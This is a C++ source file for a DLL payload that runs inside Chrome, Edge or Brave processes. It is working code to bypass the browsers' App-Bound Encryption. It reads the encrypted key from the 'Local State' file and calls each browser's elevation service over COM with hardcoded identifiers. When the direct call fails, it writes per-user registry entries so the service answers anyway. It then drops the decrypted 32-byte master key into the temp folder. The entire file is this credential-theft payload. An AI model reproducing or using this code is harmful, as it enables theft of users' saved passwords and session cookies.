// abe_payload.cpp — runs inside chrome.exe / msedge.exe / brave.exe
#define _WIN32_WINNT 0x0A00
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <objbase.h>
#include <oleauto.h>
#include <rpc.h>
#include <string>
#include <vector>
#include <cstdint>
#include <cstdio>
#include <cstring>

struct IElevatorChrome : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const BSTR, const BSTR, const BSTR,
                                                             const BSTR, const DWORD, BSTR*) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(const DWORD, const BSTR, BSTR*, DWORD*) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR, BSTR*, DWORD*) = 0;
};
struct IElevatorEdge : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE Base0() = 0;
    virtual HRESULT STDMETHODCALLTYPE Base1() = 0;
    virtual HRESULT STDMETHODCALLTYPE Base2() = 0;
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const BSTR, const BSTR, const BSTR,
                                                             const BSTR, const DWORD, BSTR*) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(const DWORD, const BSTR, BSTR*, DWORD*) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR, BSTR*, DWORD*) = 0;
};

static const CLSID kClsidChrome = { 0x708860E0,0xF641,0x4611,{0x88,0x95,0x7D,0x86,0x7D,0xD3,0x67,0x5B} };
static const CLSID kClsidEdge   = { 0x1FCBE96C,0x1697,0x43AF,{0x91,0x40,0x28,0x97,0xC7,0xC6,0x97,0x67} };
static const CLSID kClsidBrave  = { 0x576B31AF,0x6369,0x4B6B,{0x85,0x60,0xE4,0xB2,0x03,0xA9,0x7A,0x8B} };

static const IID kIidV2Chrome = { 0x1BF5208B,0x295F,0x4992,{0xB5,0xF4,0x3A,0x9B,0xB6,0x49,0x48,0x38} };
static const IID kIidV2Edge   = { 0x8F7B6792,0x784D,0x4047,{0x84,0x5D,0x17,0x82,0xEF,0xBE,0xF2,0x05} };
static const IID kIidC1 = { 0xA949CB4E,0xC4F9,0x44C4,{0xB2,0x13,0x6B,0xF8,0xAA,0x9A,0xC6,0x9C} };
static const IID kIidC2 = { 0x463ABECF,0x410D,0x407F,{0x8A,0xF5,0x0D,0xF3,0x5A,0x00,0x5C,0xC8} };
static const IID kIidC3 = { 0xB88C45B9,0x8825,0x4629,{0xB8,0x3E,0x77,0xCC,0x67,0xD9,0xCE,0xED} };
static const IID kIidE1 = { 0xC9C2B807,0x7731,0x4F34,{0x81,0xB7,0x44,0xFF,0x77,0x79,0x52,0x2B} };
static const IID kIidE2 = { 0x8F7B6792,0x784D,0x4047,{0x84,0x5D,0x17,0x82,0xEF,0xBE,0xF2,0x05} };
static const IID kIidB1 = { 0xF396861E,0x0C8E,0x4C71,{0x82,0x56,0x2F,0xAE,0x6D,0x75,0x9C,0xE9} };

static const wchar_t* kAppIdC = L"{8F2A1B44-7C3D-4E19-9A55-0B7C6D2E4F81}";
static const wchar_t* kAppIdE = L"{3D9E5C21-1A47-4B88-8E6F-2C4D7A9B0E35}";
static const wchar_t* kAppIdB = L"{6C4D9A02-5E18-4A77-B3D2-9F0E1C8A4B62}";

static std::wstring TempDir() { wchar_t b[MAX_PATH] = {0}; GetTempPathW(MAX_PATH, b); return b; }
static std::wstring Env(const wchar_t* n) {
    wchar_t b[MAX_PATH * 2] = {0};
    DWORD r = ExpandEnvironmentStringsW(n, b, MAX_PATH * 2);
    return (r && r <= MAX_PATH * 2) ? std::wstring(b) : std::wstring();
}
static std::string ReadAll(const std::wstring& p) {
    FILE* f = _wfopen(p.c_str(), L"rb");
    if (!f) return {};
    std::string o; char b[8192]; size_t n;
    while ((n = fread(b, 1, sizeof(b), f)) > 0) o.append(b, n);
    fclose(f);
    return o;
}

static std::vector<uint8_t> B64Dec(const std::string& s) {
    static const char* T = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    static int8_t rev[256]; static bool init = false;
    if (!init) { for (int i = 0; i < 256; ++i) rev[i] = -1; for (int i = 0; i < 64; ++i) rev[(uint8_t)T[i]] = (int8_t)i; init = true; }
    std::vector<uint8_t> o; uint32_t buf = 0; int bits = 0;
    for (char c : s) {
        int8_t v = rev[(uint8_t)c];
        if (v < 0) continue;
        buf = (buf << 6) | v; bits += 6;
        if (bits >= 8) { bits -= 8; o.push_back((uint8_t)(buf >> bits)); }
    }
    return o;
}
static std::vector<uint8_t> JsonField(const std::string& j, const char* key) {
    size_t p = j.find(std::string("\"") + key + "\"");
    if (p == std::string::npos) return {};
    p = j.find('"', j.find(':', p));
    if (p == std::string::npos) return {};
    size_t e = j.find('"', p + 1);
    if (e == std::string::npos) return {};
    return B64Dec(j.substr(p + 1, e - p - 1));
}

struct Target {
    std::wstring dir;
    const CLSID* clsid;
    std::vector<const IID*> iids;
    const wchar_t* appId;
    const wchar_t* svc;
    bool edge;
};

static bool Resolve(const std::wstring& label, Target& t) {
    std::wstring local = Env(L"%LOCALAPPDATA%");
    if (label == L"Chrome") {
        t.dir = local + L"\\Google\\Chrome\\User Data";
        t.clsid = &kClsidChrome;
        t.iids = { &kIidV2Chrome, &kIidC2, &kIidC1, &kIidC3 };
        t.appId = kAppIdC; t.svc = L"GoogleChromeElevationService"; t.edge = false;
    } else if (label == L"Edge") {
        t.dir = local + L"\\Microsoft\\Edge\\User Data";
        t.clsid = &kClsidEdge;
        t.iids = { &kIidV2Edge, &kIidE1 };
        t.appId = kAppIdE; t.svc = L"MicrosoftEdgeElevationService"; t.edge = true;
    } else if (label == L"Brave") {
        t.dir = local + L"\\BraveSoftware\\Brave-Browser\\User Data";
        t.clsid = &kClsidBrave;
        t.iids = { &kIidV2Chrome, &kIidB1 };
        t.appId = kAppIdB; t.svc = L"BraveElevationService"; t.edge = false;
    } else return false;
    return true;
}

static bool ServiceExists(const wchar_t* svc) {
    SC_HANDLE m = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!m) return false;
    SC_HANDLE s = OpenServiceW(m, svc, SERVICE_QUERY_STATUS);
    bool ok = s != NULL;
    if (s) CloseServiceHandle(s);
    CloseServiceHandle(m);
    return ok;
}

/* Per-user registration. LocalService is only written when the service really
   exists: COM prefers it over LocalServer32, so a per-user Chrome with no
   service would answer 0x80070424 and never reach the server path. */
static void Register(const Target& t) {
    wchar_t g[64];
    if (!StringFromGUID2(*t.clsid, g, 64)) return;
    HKEY k;
    DWORD sl = (DWORD)((wcslen(t.appId) + 1) * sizeof(wchar_t));
    bool haveSvc = ServiceExists(t.svc);

    std::wstring a = L"Software\\Classes\\AppID\\" + std::wstring(t.appId);
    if (RegCreateKeyExW(HKEY_CURRENT_USER, a.c_str(), 0, NULL, 0, KEY_SET_VALUE, NULL, &k, NULL) == ERROR_SUCCESS) {
        const wchar_t* ra = L"Interactive User";
        RegSetValueExW(k, L"RunAs", 0, REG_SZ, (const BYTE*)ra, (DWORD)((wcslen(ra) + 1) * sizeof(wchar_t)));
        if (haveSvc) {
            RegSetValueExW(k, L"LocalService", 0, REG_SZ, (const BYTE*)t.svc,
                           (DWORD)((wcslen(t.svc) + 1) * sizeof(wchar_t)));
        } else {
            RegDeleteValueW(k, L"LocalService");
        }
        RegSetValueExW(k, NULL, 0, REG_SZ, (const BYTE*)t.appId, sl);
        RegCloseKey(k);
    }

    std::wstring c = L"Software\\Classes\\CLSID\\" + std::wstring(g);
    if (RegCreateKeyExW(HKEY_CURRENT_USER, c.c_str(), 0, NULL, 0, KEY_SET_VALUE, NULL, &k, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(k, L"AppID", 0, REG_SZ, (const BYTE*)t.appId, sl);
        RegCloseKey(k);
    }

    std::wstring ls = c + L"\\LocalServer32";
    if (RegCreateKeyExW(HKEY_CURRENT_USER, ls.c_str(), 0, NULL, 0, KEY_SET_VALUE, NULL, &k, NULL) == ERROR_SUCCESS) {
        std::wstring exe;
        std::wstring srv = t.dir;
        size_t cut = srv.find(L"\\User Data");
        if (cut != std::wstring::npos) srv = srv.substr(0, cut);
        srv += L"\\Application";

        std::wstring direct = srv + L"\\elevation_service.exe";
        if (GetFileAttributesW(direct.c_str()) != INVALID_FILE_ATTRIBUTES) exe = direct;
        else {
            WIN32_FIND_DATAW fd;
            HANDLE h = FindFirstFileW((srv + L"\\*").c_str(), &fd);
            if (h != INVALID_HANDLE_VALUE) {
                do {
                    if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
                    std::wstring cand = srv + L"\\" + fd.cFileName + L"\\elevation_service.exe";
                    if (GetFileAttributesW(cand.c_str()) != INVALID_FILE_ATTRIBUTES) { exe = cand; break; }
                } while (FindNextFileW(h, &fd));
                FindClose(h);
            }
        }
        if (!exe.empty()) {
            std::wstring q = L"\"" + exe + L"\"";
            RegSetValueExW(k, NULL, 0, REG_SZ, (const BYTE*)q.c_str(),
                           (DWORD)((q.size() + 1) * sizeof(wchar_t)));
        }
        RegCloseKey(k);
    }
}

static bool TryDecrypt(void* raw, bool edge, const std::vector<uint8_t>& blob, std::vector<uint8_t>& out) {
    BSTR in = SysAllocStringByteLen((LPCSTR)blob.data(), (UINT)blob.size());
    BSTR res = NULL; DWORD err = 0;
    HRESULT hr = edge ? ((IElevatorEdge*)raw)->DecryptData(in, &res, &err)
                      : ((IElevatorChrome*)raw)->DecryptData(in, &res, &err);
    SysFreeString(in);
    bool ok = false;
    if (SUCCEEDED(hr) && res) {
        UINT n = SysStringByteLen(res);
        if (n >= 32) { out.assign((uint8_t*)res, (uint8_t*)res + 32); ok = true; }
        SysFreeString(res);
    }
    return ok;
}

static DWORD WINAPI Worker(LPVOID param) {
    HMODULE self = (HMODULE)param;

    wchar_t mod[MAX_PATH] = {0};
    GetModuleFileNameW(self, mod, MAX_PATH);
    std::wstring base = mod;
    size_t sl = base.find_last_of(L'\\');
    if (sl != std::wstring::npos) base = base.substr(sl + 1);
    if (!base.empty() && base[0] == L'a') base = base.substr(1);
    size_t us = base.find(L'_');
    if (us == std::wstring::npos) { FreeLibraryAndExitThread(self, 0); }
    std::wstring runId = base.substr(0, us);
    std::wstring label = base.substr(us + 1);
    size_t dot = label.find(L'.');
    if (dot != std::wstring::npos) label = label.substr(0, dot);

    Target t;
    if (!Resolve(label, t)) { FreeLibraryAndExitThread(self, 0); }

    std::vector<uint8_t> raw = JsonField(ReadAll(t.dir + L"\\Local State"), "app_bound_encrypted_key");
    if (raw.size() < 40 || memcmp(raw.data(), "APPB", 4) != 0) { FreeLibraryAndExitThread(self, 0); }
    std::vector<uint8_t> blob(raw.begin() + 4, raw.end());

    if (CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE) != S_OK &&
        CoInitializeEx(NULL, COINIT_APARTMENTTHREADED) != S_OK) { FreeLibraryAndExitThread(self, 0); }

    std::vector<uint8_t> key;
    std::wstring log = TempDir() + L"\\abe_" + runId + L"_" + label + L".log";
    std::string trace;

    /* 1: no registration, machine-wide CLSID only */
    for (size_t ii = 0; ii < t.iids.size() && key.empty(); ++ii) {
        void* p = NULL;
        HRESULT hr = CoCreateInstance(*t.clsid, NULL, CLSCTX_LOCAL_SERVER, *t.iids[ii], &p);
        trace += "bare" + std::to_string(ii) + "=" + std::to_string((long)hr) + " ";
        if (FAILED(hr) || !p) continue;
        CoSetProxyBlanket((IUnknown*)p, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                          RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE,
                          NULL, EOAC_DYNAMIC_CLOAKING);
        TryDecrypt(p, t.edge, blob, key);
        ((IUnknown*)p)->Release();
    }

    /* 2: per-user registration */
    if (key.empty()) {
        Register(t);
        for (size_t ii = 0; ii < t.iids.size() && key.empty(); ++ii) {
            void* p = NULL;
            HRESULT hr = CoCreateInstance(*t.clsid, NULL, CLSCTX_LOCAL_SERVER, *t.iids[ii], &p);
            trace += "reg" + std::to_string(ii) + "=" + std::to_string((long)hr) + " ";
            if (FAILED(hr) || !p) continue;
            CoSetProxyBlanket((IUnknown*)p, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                              RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE,
                              NULL, EOAC_DYNAMIC_CLOAKING);
            TryDecrypt(p, t.edge, blob, key);
            ((IUnknown*)p)->Release();
        }
    }
    trace += "len=" + std::to_string(key.size());

    FILE* lf = _wfopen(log.c_str(), L"wb");
    if (lf) { fwrite(trace.data(), 1, trace.size(), lf); fclose(lf); }

    if (key.size() == 32) {
        std::wstring out = TempDir() + L"\\abe_" + runId + L"_" + label + L".key";
        FILE* f = _wfopen(out.c_str(), L"wb");
        if (f) { fwrite(key.data(), 1, 32, f); fclose(f); }
    }

    CoUninitialize();
    FreeLibraryAndExitThread(self, 0);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(h);
        HANDLE t = CreateThread(NULL, 0, Worker, h, 0, NULL);
        if (t) CloseHandle(t);
    }
    return TRUE;
}
